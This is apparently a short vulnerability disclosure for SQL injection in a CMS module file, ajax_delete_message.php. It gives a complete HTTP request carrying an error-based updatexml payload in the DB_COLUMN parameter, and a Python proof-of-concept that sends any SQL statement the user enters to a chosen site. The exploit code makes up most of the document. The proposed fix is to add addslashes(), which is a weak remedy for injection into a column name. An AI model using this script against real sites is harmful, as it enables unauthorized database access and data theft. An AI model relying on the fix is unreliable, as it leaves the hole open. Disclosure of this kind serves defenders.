# SQL injection In modules/miniform/ajax_delete_message.php multiple post parameter combinations exist error injection

![image-20230121023625040](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202301211438742.png)

request packet

```
POST /modules/miniform/ajax_delete_message.php HTTP/1.1
Host: stu
Content-Length: 170
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://stu
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://stu/modules/miniform/ajax_delete_message.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

DB_RECORD_TABLE=droplets&purpose=delete_record&action=delete&DB_COLUMN=id%60+%3D+-1+or+updatexml%281%2Cconcat%28%27%24%27%2C%28database%28%29%29%29%2C0%29%23&iRecordID=-1
```

poc

```python
import requests

url = input("Enter url:")
url = url+"/modules/miniform/ajax_delete_message.php"
pay = input("Enter the sql statement you want to execute:")
data={
"DB_RECORD_TABLE":"droplets",
    "purpose":"delete_record",
    "action":"delete",
    "DB_COLUMN":f"id` = -1 or updatexml(1,concat('$',({pay})),0)#",
    "iRecordID":"-1"
}
res = requests.post(url,data=data)
print(res.text)
```

![image-20230121143533422](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202301211438287.png)

Repair plan 

add addslashes()

![image-20230121222546074](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202301212225763.png)
